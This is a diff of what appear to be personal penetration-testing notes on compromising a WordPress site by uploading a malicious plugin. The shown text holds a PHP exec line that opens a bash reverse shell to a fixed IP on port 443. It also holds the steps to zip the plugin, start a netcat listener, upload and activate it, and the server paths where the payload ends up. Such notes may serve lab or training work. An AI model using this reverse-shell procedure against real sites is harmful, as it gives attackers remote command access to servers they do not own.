@@ -241,12 +241,19 @@ note: Only the plugin : name is needed
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.215/443 0>&1'");
 ?>
 
+zip up that file, I used
+
+zip evil evil
+
 open a netcat listener using nc -lvnp 443
 
 uploading and activating the plugin launches the connection!
 
 maybe useful urls:?
 /wp-admin/plugins.php?plugin_status=all&paged=1&s -- list all plugins
+
+The plugin was uploaded to /var/www/wordpress/wp-content/plugins/evil
+with the payload at /var/www/wordpress/wp-content/plugins/evil/evil.php
 
 
 
